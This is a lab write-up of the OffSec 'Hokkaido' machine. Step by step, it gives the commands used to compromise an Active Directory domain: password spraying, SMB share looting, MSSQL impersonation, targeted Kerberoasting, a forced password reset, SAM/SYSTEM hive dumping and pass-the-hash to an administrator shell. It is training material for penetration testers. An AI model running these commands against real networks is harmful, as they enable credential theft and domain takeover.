![Hokkaido attack path](/images/lab-writeups/hokkaido.svg)

# Hokkaido Write-Up

Source: OffSec

Difficulty: Intermediate

Categories: Active Directory, Kerbrute, SMB, NETLOGON, Kerberoasting, MSSQL, BloodHound, GenericWrite, targeted Kerberoast, ForceChangePassword, SeBackupPrivilege, pass-the-hash

## Raw Attack Chain

```text
Kerbrute username enumeration
-> SMB username=password spray
-> info:info
-> SMB share enumeration
-> NETLOGON/temp/password_reset.txt
-> Start123!
-> spray Start123!
-> discovery:Start123!
-> MSSQL access
-> impersonate hrappdb-reader
-> hrappdb.sysauth
-> hrapp-service:Untimed$Runny
-> BloodHound collection
-> hrapp-service GenericWrite over Hazel.Green
-> targeted Kerberoast
-> Hazel.Green:haze1988
-> Hazel.Green can reset Molly.Smith through TIER2-ADMINS path
-> Molly.Smith:Password@123
-> Molly.Smith has SeBackupPrivilege
-> reg save SAM and SYSTEM
-> secretsdump local hives
-> Administrator NTLM hash
-> evil-winrm pass-the-hash
-> administrator shell
```

## Initial Recon

Kerbrute was used to enumerate usernames:

```bash
kerbrute userenum -d hokkaido-aerospace.com --dc $target \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Valid users included:

```text
info
administrator
discovery
maintenance
```

SMB null and guest checks were attempted:

```bash
nxc smb $target -u '' -p ''
nxc smb $target -u 'guest' -p ''
```

LDAP anonymous bind was also tested:

```bash
nxc ldap $target -u '' -p '' --users
```

The first successful credential came from a username-equals-password spray:

```bash
nxc smb $target -u users.txt -p users.txt --continue-on-success
```

Result:

```text
hokkaido-aerospace.com\info:info
```

## SMB Enumeration

Shares with `info:info`:

```bash
nxc smb $target -u info -p info --shares
```

Important shares:

```text
homes                  READ,WRITE
IPC$                   READ
NETLOGON               READ
SYSVOL                 READ
UpdateServicesPackages READ
WsusContent            READ
```

Browse `NETLOGON`:

```bash
smbclient -U 'info' //$target/NETLOGON
```

Inside `temp`:

```text
password_reset.txt
```

Download and read it:

```bash
get password_reset.txt
cat password_reset.txt
```

Contents:

```text
Initial Password: Start123!
```

Spray `Start123!`:

```bash
nxc smb $target -u users.txt -p 'Start123!' --continue-on-success
```

Result:

```text
discovery:Start123!
```

## Kerberos Checks

AS-REP roasting was tested:

```bash
impacket-GetNPUsers hokkaido-aerospace.com/ -dc-ip $target \
  -usersfile validusers.txt
```

No users had `UF_DONT_REQUIRE_PREAUTH` set.

Kerberoasting with `info:info` produced SPNs:

```bash
impacket-GetUserSPNs hokkaido-aerospace.com/info:info \
  -dc-ip $target -request
```

Discovered service accounts:

```text
discover/dc.hokkaido-aerospace.com     discovery
maintenance/dc.hokkaido-aerospace.com  maintenance
```

Cracking the hashes did not progress the attack:

```bash
hashcat -m 13100 info.hash /usr/share/wordlists/rockyou.txt
```

The better route was MSSQL with the known `discovery` credentials.

## MSSQL Foothold

Confirm access:

```bash
nxc mssql $target -u discovery -p 'Start123!'
```

Connect:

```bash
mssqlclient.py hokkaido-aerospace.com/discovery:'Start123!'@$target -windows-auth
```

Inside MSSQL:

```sql
enum_db
enum_impersonate
```

Databases:

```text
master
tempdb
model
msdb        TRUSTWORTHY
hrappdb
```

Impersonation showed `hrappdb-reader`:

```text
IMPERSONATE GRANT grantee HAERO\services grantor hrappdb-reader
```

Impersonate:

```sql
EXECUTE AS LOGIN = 'hrappdb-reader';
select system_user;
```

Switch database and enumerate:

```sql
use hrappdb
select name from sys.tables;
select * from sysauth;
```

Credential recovered:

```text
hrapp-service : Untimed$Runny
```

## BloodHound Collection

Fix DNS:

```bash
echo "$target hokkaido-aerospace.com DC" | sudo tee -a /etc/hosts
```

Collect with `hrapp-service`:

```bash
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' \
  -d hokkaido-aerospace.com -c all --zip -ns $target
```

BloodHound showed:

- `hrapp-service` has GenericWrite on `Hazel.Green`.
- `Hazel.Green` is a member of `TIER2-ADMINS`.
- `TIER2-ADMINS` has ForceChangePassword on `Molly.Smith`.
- `Molly.Smith` has SeBackupPrivilege.

This was the full AD path.

## Targeted Kerberoast

GenericWrite over a user allows writing an SPN. Targeted Kerberoasting abuses that by:

1. Adding an SPN to the target user.
2. Requesting a TGS for that SPN.
3. Cracking the TGS offline.
4. Removing the SPN.

Run:

```bash
python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' \
  -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $target
```

Hash for `Hazel.Green` was printed.

Crack:

```bash
hashcat -m 13100 hazel.hash /usr/share/wordlists/rockyou.txt
```

Result:

```text
Hazel.Green:haze1988
```

## ForceChangePassword Against Molly.Smith

Using Hazel's rights:

```bash
net rpc password "Molly.Smith" "Password@123" \
  -U "hokkaido-aerospace.com"/"Hazel.Green"%"haze1988" \
  -S "dc.hokkaido-aerospace.com"
```

Confirm:

```bash
nxc smb $target -u 'Molly.Smith' -p 'Password@123'
```

Result:

```text
[+] hokkaido-aerospace.com\Molly.Smith:Password@123
```

## RDP and SeBackupPrivilege

RDP as Molly:

```bash
xfreerdp3 /v:$target /u:'Molly.Smith' /p:'Password@123'
```

Using a drive share helped move files when SMB transfer from the target to attacker did not work:

```bash
xfreerdp3 /v:$target /u:'Molly.Smith' /p:'Password@123' /drive:share,/path/to/local/dir
```

On Windows:

```cmd
whoami /priv
```

SeBackupPrivilege was present.

Dump registry hives:

```cmd
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```

Transfer `sam` and `system` to the attacker machine.

## secretsdump and Pass-the-Hash

Correct syntax:

```bash
secretsdump.py -sam sam.sav -system system.sav local
```

The SYSTEM hive is required because it contains the bootkey needed to decrypt SAM hashes.

Recovered Administrator hash:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
```

Pass the hash:

```bash
evil-winrm -i hokkaido-aerospace.com -u administrator \
  -H d752482897d54e239376fddb2a2109e4
```

Read flags:

```powershell
type \users\administrator\desktop\proof.txt
Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue
type \local.txt
```

## Troubleshooting Notes

If `smbserver.py` fails with port 445 already in use:

```bash
sudo fuser 445/tcp
sudo lsof -i :445
sudo kill -9 <PID>
```

Use `sudo` when checking privileged ports; otherwise the owning process may not be shown.

If SMB transfer is blocked or awkward, RDP drive redirection can be cleaner.

PowerShell aliases can differ from CMD behavior. In PowerShell, `where` maps to `Where-Object`, so use:

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue
```

## Mental Models

In Active Directory, every credential is a graph node. The right question after getting a credential is not only "Can I shell with it?" but also "What can this identity control?"

Readable shares often contain operational mistakes: reset passwords, scripts, configuration files, database backups, and service credentials.

Service accounts should be collected with BloodHound because they frequently have stale permissions.

MSSQL should be enumerated for impersonation, linked servers, database trust, credential tables, and `xp_cmdshell` paths.

SeBackupPrivilege means the user can often read protected files through backup semantics. `reg save` uses the relevant API behavior internally, so it can dump hives even when normal file reads would fail.

## Improvements

Run BloodHound immediately after getting any AD credential.

Check Outbound Object Control for every owned user.

Do not spend too long cracking Kerberoast hashes if another authenticated service path is available.

Use `enum_impersonate` immediately after connecting to MSSQL.

Use RDP drive mapping when SMB file transfer is unreliable.
